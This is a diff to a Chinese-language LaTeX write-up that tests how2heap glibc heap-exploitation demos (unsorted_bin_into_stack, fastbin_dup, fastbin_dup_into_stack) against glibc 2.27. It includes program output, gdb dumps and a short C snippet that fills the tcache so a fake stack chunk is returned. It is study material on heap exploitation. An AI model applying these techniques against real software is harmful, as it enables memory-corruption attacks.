@@ -624,12 +624,101 @@ static void * tcache_get (size_t tc_idx) {
 
 这里值得注意的是，\verb+ tcache_get()+函数内部不包含任何检查措施，也是我们利用成功的原因之一。
 
+\subsection{unsorted\_bin\_into\_stack}
+
+编译，运行，攻击没有成功：
+\begin{minted}[breaklines, frame=lines]{bash}
+$ how2heap-227 ./unsorted_bin_into_stack
+Allocating the victim chunk
+Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
+Freeing the chunk 0x164b260, it will be inserted in the unsorted bin
+Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
+Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
+Now next malloc will return the region of our fake chunk: 0x7ffd5f1d1600
+malloc(0x100): 0x164b260
+
+\end{minted}
+
+攻击失败了，gdb调试可以看到：
+\begin{minted}[breaklines, frame=lines]{bash}
+gef> x/30gx 0x0000000000602000+0x10
+0x602010:   0x0000000000000000  0x0100000000000000 <-- tcache_1
+0x602020:   0x0000000000000000  0x0000000000000000
+........:   ...                 ...
+0x6020c0:   0x0000000000000000  0x0000000000602260 <-- address of victim
+
+\end{minted}
+
+可以很明显的看到，就像之前影响\verb+ free()+的一样，同样是tcache影响了，我们只需要在代码中将tcache占满即可：
+\begin{minted}[breaklines, frame=lines]{c}
+// deal with tcache
+ int *k[10], i;
+ for (i = 0; i < 7; i++) {
+     k[i] = malloc(0x80);
+ }
+ for (i = 0; i < 7; i++) {
+     free(k[i]);
+ }
+\end{minted}
+
+添加后编译运行，攻击成功：
+
+\begin{minted}[frame=lines, breaklines]{bash}
+$ how2heap-227 ./unsorted_bin_into_stack
+Allocating the victim chunk
+Allocating another chunk to avoid consolidating the top chunk with the small one during the free()
+Freeing the chunk 0x1e53260, it will be inserted in the unsorted bin
+Create a fake chunk on the stackSet size for next allocation and the bk pointer to any writable addressNow emulating a vulnerability that can overwrite the victim->size and victim->bk pointer
+Size should be different from the next request size to return fake_chunk and need to pass the check 2*SIZE_SZ (> 16 on x64) && < av->system_mem
+Now next malloc will return the region of our fake chunk: 0x7ffe370742b0
+malloc(0x100): 0x7ffe370742b0
+
+\end{minted}
+
 \subsection{fastbin\_dup}
+
+编译运行，依然可以利用成功：
+\begin{minted}[breaklines, frame=lines]{bash}
+$ how2heap-227 ./fastbin_dup            
+Allocating 3 buffers.
+1st malloc(9) 0x24c6260 points to AAAAAAAA
+2nd malloc(9) 0x24c6280 points to BBBBBBBB
+3rd malloc(9) 0x24c62a0 points to CCCCCCCC
+Freeing the first one 0x24c6260.
+Then freeing another one 0x24c6280.
+Freeing the first one 0x24c6260 again.
+Allocating 3 buffers.
+4st malloc(9) 0x24c6260 points to DDDDDDDD the first time
+5nd malloc(9) 0x24c6280 points to EEEEEEEE
+6rd malloc(9) 0x24c6260 points to FFFFFFFF the second time
+
+\end{minted}
 
 \subsection{fastbin\_dup\_into\_stack}
 
+编译运行，可以利用成功：
+\begin{minted}[breaklines, frame=lines]{bash}
+$ how2heap-227 ./fastbin_dup_into_stack 
+Allocating 3 buffers.
+1st malloc(9) 0x7b4260 points to AAAAAAAA
+2nd malloc(9) 0x7b4280 points to BBBBBBBB
+3rd malloc(9) 0x7b42a0 points to CCCCCCCC
+Freeing the first one 0x7b4260.
+Then freeing another one 0x7b4280.
+Freeing the first one 0x7b4260 again.
+Allocating 4 buffers.
+4nd malloc(9) 0x7b4260 points to 0x7ffd81252860
+5nd malloc(9) 0x7b4280 points to EEEEEEEE
+6rd malloc(9) 0x7b4260 points to FFFFFFFF
+7th malloc(9) 0x7ffd81252850 points to GGGGGGGG
+
+\end{minted}
+
 \subsection{overlapping\_chunks}
+
+攻击成功。
 
 \subsection{overlapping\_chunks\_2}
 
+攻击成功。
 \newpage
